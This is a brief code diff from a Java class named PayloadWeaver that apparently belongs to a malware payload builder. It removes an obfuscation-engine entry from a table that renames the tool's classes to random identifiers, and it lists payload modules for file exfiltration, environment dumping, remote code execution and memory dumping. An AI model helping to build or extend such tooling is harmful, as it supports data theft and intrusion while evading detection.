@@ -146,8 +146,6 @@ public class PayloadWeaver {
                 targetPath + "/c/" + randomIdentifier(2, 4, true));
         remapTable.put("dev/naruto/astrox/core/PayloadWeaver",
                 targetPath + "/c/" + randomIdentifier(2, 4, true));
-        remapTable.put("dev/naruto/astrox/obfuscation/ObfuscationEngine",
-                targetPath + "/c/" + randomIdentifier(2, 4, true));
 
         // Payload modules (ServiceLoader)
         String[] modules = {"FileExfilModule", "EnvDumpModule", "RCEModule", "MemoryDumpModule"};
